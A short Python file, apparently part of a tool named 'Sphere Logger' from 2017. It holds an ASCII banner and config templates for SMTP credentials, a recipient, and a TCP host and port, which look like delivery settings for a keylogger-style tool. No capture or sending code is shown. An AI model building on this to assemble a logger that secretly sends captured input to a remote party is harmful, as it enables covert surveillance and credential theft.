# -*- coding: utf-8 -*-

from SPLib import __version__

logo = '''
                    888
                    888
                    888
    .d8888b 88888b. 88888b.  .d88b. 888d888 .d88b.
    88K     888 "88b888 "88bd8P  Y8b888P"  d8P  Y8b
    "Y8888b.888  888888  88888888888888    88888888
         X88888 d88P888  888Y8b.    888    Y8b.
     88888P'88888P" 888  888 "Y8888 888     "Y8888
            888
            888
            888

                Sphere Logger v{} (2017)
'''.format(__version__)

template_txt = '''
USER = '{login}'
PASSWORD = '{password}'
REC = '{rec}'
SERVER = '{smtp}'
PORT = {port}
'''

tcp_template_txt = '''
PORT = {port}
HOST = '{host}'
'''
